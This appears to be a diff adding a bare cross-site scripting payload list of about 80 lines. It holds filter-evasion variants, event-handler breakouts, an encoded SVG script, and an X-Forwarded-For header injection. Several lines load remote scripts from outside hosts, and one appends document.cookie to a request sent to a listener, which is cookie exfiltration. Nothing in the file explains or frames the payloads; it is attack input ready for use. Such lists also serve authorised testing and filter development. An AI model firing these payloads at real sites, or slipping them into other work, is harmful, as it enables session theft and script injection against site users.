@@ -1,0 +1,80 @@
+'"><script>alert(document.domain)</script><';
+
+cannary%27%22%3E%3Cscript%20src=https://openbugbounty.org/1.js%3E%3C%27;
+
+<marquee loop=1 width=0 onfinish=confirm(1)>0</marquee>
+
+'"><marquee loop=1 width=0 onfinish=document.write(/xss-b!tches/)>/marquee><';
+
+%27%22%3E%3Cmarquee%20loop=1%20width=0%20onfinish=document.write(/xss-b!tches/)%3E0%3C/marquee%3E%3C%27;
+ 
+'">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex  formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
+
+'">><marquee><img src=x onerror=confirm(1)></marquee>" >
+
+<script>src='<img src="http://127.0.0.1:121?test';src.concat(document.cookie);src.concat('" />');document.write(src);</script>
+
+<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0iY2hpbGljbyI+PHNjcmlwdCB0eXBlPSJ0ZXh0L2VjbWFzY3JpcHQiPmFsZXJ0KCJDaGlsaWNvIik7PC9zY3JpcHQ+PC9zdmc+" type="image/svg+xml" allowscriptaccess="always" />"/>
+
+"-alert(0)-"
+";alert(0);//
+'-alert(0)-'
+"+alert(0)+"
+");alert(0);//
+"onfocus="alert(0)" k="
+"onmouseover=alert(0)
+"onmousenter="alert(0)" k="
+"on%0dmouseover=alert(0)" k="
+"onmouseover%3D=alert(0)" a="
+"onmouseover=alert(0)"=
+<svg%0donload=prompt(1)>
+java%0d%0ascript%0d%0a:alert(0)
+<svg%0donload=prompt(1)>
+<input onfocus=alert(0) autofocus>
+\\"-alert(0);//
+"onmouseenter=confirm(1)>
+%uff1cscript%uff1ealert(1)%uff1c/script%uff1e
+<base href=//https://openbugbounty.org/1.js>
+"autofocus/onfocus=alert(1)//
+"><svg onload=alert(1)//
+\'-alert(1)//
+</script><svg onload=alert(1)>
+<svg onload=alert&lpar;1&rpar;>
+<svg onload=alert&#x28;1&#x29>
+<svg onload=alert&#40;1&#41>
+<menu id=x contextmenu=x onshow=alert(1)>right click me!
+<script src=//brutelogic.com.br/1.js> 
+'>alert(1)</script><script/1=' 
+*/alert(1)</script><script>/*
+'onload=alert(1)><svg/1='
+*/alert(1)">'onload="/*<svg/1=' 
+`-alert(1)">'onload="`<svg/1='
+*/</script>'>alert(1)/*<script/1='
+p=<svg/1='&q='onload=alert(1)>
+<script src="data:&comma;alert(1)// 
+"><script src=data:&comma;alert(1)// 
+<script src="//brutelogic.com.br&sol;1.js&num; 
+"><script src=//brutelogic.com.br&sol;1.js&num; 
+<link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt; 
+"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
+"-alert(0)-""><input onfocus=alert(0) autofocus>
+";alert(0);//
+javascript://%0aalert(31337);
+\"><audio/onloadstart=(confirm(document.URL)) src>
+"><input type="submit" formaction="javascript&colon;this&lsqb;'a'&plus;'lert'&rsqb;`1`"
+
+X-Forwarded-For: "><img src=x onerror=alert(0);/>   # add this on the headers
+
+
+
+
+
+
+
+
+
+
+
+
+
+
